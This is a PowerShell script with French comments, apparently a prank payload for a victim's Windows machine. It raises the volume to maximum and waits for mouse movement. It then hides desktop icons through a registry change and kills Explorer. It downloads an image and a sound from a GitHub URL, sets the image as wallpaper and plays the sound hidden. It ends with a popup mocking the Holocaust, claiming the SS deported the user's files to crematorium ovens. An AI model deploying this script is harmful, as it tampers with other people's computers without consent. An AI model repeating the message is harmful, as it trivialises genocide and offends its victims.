function Set-Volume-Max {
    $o = New-Object -ComObject WScript.Shell
    for ($i = 0; $i -lt 100; $i++) {
        $o.SendKeys([char] 175) # Augmenter le volume
        Start-Sleep -Milliseconds 50 # Petit délai pour garantir que chaque appui est pris en compte
    }
}

# Mettre le volume au maximum
Set-Volume-Max

function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms

    # Récupérer la position initiale de la souris
    $originalPOS = [System.Windows.Forms.Cursor]::Position

    Write-Host "En attente d'un mouvement de la souris..."
    while ($true) {
        # Récupérer la position actuelle de la souris
        $currentPOS = [System.Windows.Forms.Cursor]::Position

        # Vérifier si la position de la souris a changé
        if ($currentPOS.X -ne $originalPOS.X -or $currentPOS.Y -ne $originalPOS.Y) {
            # Si la souris a bougé, sortir de la boucle
            Write-Host "Mouvement de souris détecté. Continuation du script."
            break
        }
        # Sinon attendre quelques secondes avant de vérifier à nouveau
        Start-Sleep -Seconds 1
    }
}

# Appeler la fonction pour attendre un mouvement de souris
Pause-Script

# Hides Desktop Icons
$Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
Get-Process "explorer" | Stop-Process

# Définir les URLs des fichiers sur GitHub
$imageUrl = "https://raw.githubusercontent.com/ertvg/h/main/naze.jpg"
$soundUrl = "https://raw.githubusercontent.com/ertvg/h/main/Erika.wav"

# Définir les chemins de téléchargement locaux
$imagePath = "$env:TEMP\wallpaper.jpg"
$soundPath = "$env:TEMP\sound.wav"

# Télécharger l'image
Write-Host "Téléchargement de l'image..."
Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath

# Télécharger le son
Write-Host "Téléchargement du son..."
Invoke-WebRequest -Uri $soundUrl -OutFile $soundPath

# Changer le fond d'écran
Write-Host "Modification du fond d'écran..."
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public const int SPI_SETDESKWALLPAPER = 0x0014;
    public const int SPIF_UPDATEINIFILE = 0x01;
    public const int SPIF_SENDCHANGE = 0x02;
    public static void SetWallpaper(string path) {
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    }
}
"@

[Wallpaper]::SetWallpaper($imagePath)

# Jouer le son via wmplayer.exe pour garantir la continuité après la fermeture de PowerShell
Write-Host "Lecture du son via Windows Media Player..."
Start-Process -FilePath "wmplayer.exe" -ArgumentList "$soundPath" -WindowStyle Hidden

# Ajouter une MessageBox popup
Write-Host "Affichage de la MessageBox..."
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[System.Windows.Forms.MessageBox]::Show("ACHTUNG ! DIE SS HAT IHRE DATEIEN IN DIE SCHOPFEROFEN DEPORTIERT !`n`nATTENTION ! LES SS ONT DEPORTE VOS FICHIERS DANS LES FOURS CREMATOIRES !", "ACHTUNG !!!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)

